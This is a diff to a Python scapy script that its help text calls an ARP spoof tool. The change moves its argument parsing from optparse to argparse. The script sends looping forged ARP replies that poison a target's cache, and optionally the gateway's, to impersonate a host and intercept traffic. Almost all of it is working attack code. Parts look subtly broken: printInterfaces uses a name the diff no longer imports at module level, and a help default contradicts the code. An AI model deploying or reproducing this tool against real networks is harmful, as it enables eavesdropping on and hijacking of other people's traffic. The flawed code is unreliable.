@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 
-from optparse import OptionParser
-from scapy.all import sendp, ifaces, Ether, ARP
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+from argparse import ArgumentParser
 
 def printInterfaces():
     for iface in ifaces.keys():
@@ -17,31 +19,32 @@ def getIfaceMAC():
     pass
         
 def main():
-    usage = "usage: %prog [options] <-i interface> <-t IP to impersonate>"
-    parser = OptionParser(usage)
-    parser.add_option('-t', '--targetIP', help='IP of target to attack')
-    parser.add_option('-p', '--impersonateIP', default=getGatewayIP(), help='IP to impersonate')
-    parser.add_option('-i', dest='interface', help='specify interface to MAC spoof on')
-    parser.add_option('-s', dest='sourceMAC', default=getIfaceMAC(), help='source MAC of attacker')
-    parser.add_option('-d', dest='delay', type='float', default=1.0, help='delay in seconds between packets broadcasted')
-    parser.add_option('-gw',dest='spoof_gw', action='store_true', default=False, help='spoof gateway as well')
+    parser = ArgumentParser(description="just another ARP spoof tool")
+    parser.add_argument('-p', '--impersonateIP', default=getGatewayIP(), help='IP to impersonate')
+    parser.add_argument('-i', dest='interface', help='specify interface to MAC spoof on')
+    parser.add_argument('-s', dest='sourceMAC', default=getIfaceMAC(), help='source MAC of attacker (default = interfaceMAC)')
+    parser.add_argument('-d', dest='delay', type=float, default=1.0, help='delay in seconds between packets broadcasted (default = 2 seconds)')
+    parser.add_argument('--gw',dest='spoof_gw', action='store_true', default=False, help='spoof local gateway as well (default = false)')
+    parser.add_argument('targetIP', help='IP of target to attack')
     
-    options, args = parser.parse_args()
+    parsed_args = parser.parse_args()
     
-    targetIP        = options.targetIP
-    interface       = options.interface
-    impersonateIP   = options.impersonateIP
-    sourceMAC       = options.sourceMAC
-    delay           = options.delay
-    spoof_gw        = options.spoof_gw
+    targetIP        = parsed_args.targetIP
+    interface       = parsed_args.interface
+    impersonateIP   = parsed_args.impersonateIP
+    sourceMAC       = parsed_args.sourceMAC
+    delay           = parsed_args.delay
+    spoof_gw        = parsed_args.spoof_gw
     
     for manadatory_option in (targetIP, interface):
         if manadatory_option == None:
             print(parser.usage)
-            print("iterfaces:")
+            print("available iterfaces:")
             printInterfaces()
             exit(0)
-        
+    
+    from scapy.all import sendp, ifaces, Ether, ARP
+    
     target_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=impersonateIP, pdst=targetIP)
     spoof_pkts = [target_arp_spoof_pkt]
     
@@ -53,7 +56,7 @@ def main():
     
     try:
         sendp(spoof_pkts, inter=delay, loop=True)
-    except KeyboardInterrupt, SystemExit:
+    except (KeyboardInterrupt, SystemExit):
         exit(0)
     
    
